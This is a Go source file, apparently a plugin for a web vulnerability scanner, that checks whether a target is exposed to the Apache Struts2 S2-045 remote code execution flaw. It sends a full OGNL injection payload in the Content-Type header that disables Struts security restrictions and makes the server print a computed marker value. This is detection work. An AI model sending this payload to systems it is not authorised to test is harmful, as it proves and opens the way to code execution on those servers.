package webapp

import (
	"errors"
	"glint/logger"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	"glint/util"
	"time"

	"github.com/thoas/go-funk"
)

type interestingExtensions struct {
	Action int
	Do     int
	Jsp    int
	Page   int
}

type UPFile struct {
	scheme                 layers.Scheme
	targetURL              string
	inputIndex             int
	reflectionPoint        int
	disableSensorBased     bool
	currentVariation       int
	foundVulnOnVariation   bool
	variations             *util.Variations
	lastJob                layers.LastJob
	trueFeatures           *layers.MFeatures
	lastJobProof           interface{}
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	isUnknown              bool
	VulnPayload            string
}

// func test
func prepareUrlsToBeTested(Scanlist util.ScanSiteState) []string {
	var urls = []string{}
	preferredCount := 50
	interestingExtensions := []string{
		"Action",
		"Do",
		"Jsp",
		"Page",
	}
	for i := 0; i < preferredCount; i++ {

		if len(urls) >= preferredCount {
			break
		}
		var sf = Scanlist.GetFile(i)
		//!sf.NotFound && !sf.Ignored && sf.ScanSiteFile &&
		if sf.IsFile {
			Ext, _ := util.GetFileExt(sf.Filename)
			if funk.Contains(interestingExtensions, Ext) {
				urls = append(urls, sf.Url)
			}
		}

		// if no preferredCount preferred files were found,
		// add the first preferredCount non-static files if Java was detected.
		// if IsJava && len(urls) < preferredCount {
		// 	for i := 0; i < list.Count; i++ {
		// 		if len(urls) >= preferredCount {
		// 			break
		// 		}
		// 	}
		// }

	}
	return urls
}

func (uf *UPFile) StartTesting() bool {
	var (
		foundfile bool
		// foundfile_index int
		// filename        string
		// lookfor_filepath string
		// contenttype string
	)
	for _, v := range uf.variations.Params {
		if v.IsFile {
			foundfile = true
			// foundfile_index = idx
			// filename = v.Filename
			// contenttype = v.ContentType
		}
	}
	if !foundfile {
		return false
	}

	// exp := make(map[string]string)
	// exp["filename"] = filename
	// //设置struts2 的payload
	// exp["contenttype"] = "text/plain"
	uf.lastJob.Layer.Headers["Content-Type"] = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
		".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony" +
		".xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." +
		"opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames()." +
		"clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(" +
		"#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." +
		"getOutputStream())).(#ros.println(31337*31337)).(#ros.flush())}"
	///先请求一次
	req, resp, err := uf.lastJob.Layer.Sess.Get(uf.targetURL, uf.lastJob.Layer.Headers)
	if err != nil {
		logger.Debug("Plreq request error: %v", err)
		return false
	}
	req.CopyTo(&uf.trueFeatures.Request)
	resp.CopyTo(&uf.trueFeatures.Response)
	body := resp.String()
	if funk.Contains(body, "982007569") {
		return true
	}
	return false
}

func extendLastJobLayer(cupFile *UPFile, sess *nenet.Session, param layers.PluginParam) {
	cupFile.lastJob.Layer.Sess = sess
	cupFile.lastJob.Layer.Method = param.Method
	cupFile.lastJob.Layer.ContentType = param.ContentType
	cupFile.lastJob.Layer.Headers = param.Headers
	cupFile.lastJob.Layer.Body = []byte(param.Body)
}

func Struts2_045_Vaild(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var variations *util.Variations
	var cupFile UPFile
	//var hostid int64
	gd := args
	// var blastIters interface{}
	util.Setup()
	var Param layers.PluginParam
	// layers.Init()
	ct := layers.CheckType{IsMultipleUrls: false}
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       60 * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	cupFile.lastJob.Init(Param)
	// variations, err = util.ParseUri(url)
	// BlindSQL.variations =
	if value, ok := Param.Headers["Content-Type"]; ok {
		Param.ContentType = value
	}

	variations, err := util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
	if err != nil {
		// logger.Error(err.Error())
		return nil, false, errors.New("not found")
	}

	//赋值
	cupFile.variations = variations
	cupFile.targetURL = Param.Url
	extendLastJobLayer(&cupFile, sess, Param)

	//先搜索回复里面的文件
	if cupFile.StartTesting() {
		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			"Struts2_S2045 Vulnerable",
			[]string{string(cupFile.trueFeatures.Request.String())},
			[]string{string(cupFile.trueFeatures.Response.String())},
			"high",
			Param.Hostid, string(plugin.Struts2))
		gd.Alert(Result)
		return Result, true, nil
	}

	return nil, false, errors.New("not found")

}
